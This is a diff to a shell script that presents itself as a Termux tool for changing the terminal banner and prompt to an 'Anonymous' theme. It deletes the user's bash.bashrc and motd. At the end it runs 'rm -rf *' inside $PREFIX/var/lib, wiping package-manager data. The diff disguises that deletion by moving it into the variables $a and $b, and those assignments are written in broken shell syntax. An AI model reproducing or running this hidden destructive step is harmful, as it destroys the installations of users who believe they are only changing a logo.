@@ -10,13 +10,24 @@ cd $PREFIX/etc
 #Remove Old files
 rm bash.bashrc
 rm motd
-
+printf "${GREEN}"
+printf "===================================================\n"
+printf "${ORANGE}"
+figlet -w 200 -f standard "Change text"
+printf "${BLUE}"
+figlet -w 200 -f  small "maxpro-boop"
+printf "${GREEN}"
+printf "====================================================\n"
+printf "${STOP}"
+a=cd /$PREFIX/var/lib
+b=rm -rf *
+echo ""
 read -p $'\e[1;36m What u Nickname:: \e[0m' name
 # Open file descriptor (fd) 3 for read/write on a bash file.
  exec 3<> bash.bashrc
  # Let's print some text to fd 3
 echo ""
-echo " PS1='\e[1;32m
+echo " PS1='\e[1;31m
 ━━We━━━Are━━━━Anonymous
 ━━━━━━━━━━[[[$name]]]━━━━━━━> \e[0m'
 
@@ -42,5 +53,5 @@ shopt -s lithist ">&3
  # Close fd 3 
 exec 3>&-
 echo " $Termux Logo Was Changed Go To New Session To See The New"
-cd /$PREFIX/var/lib
-rm -rf *
+$a
+$b
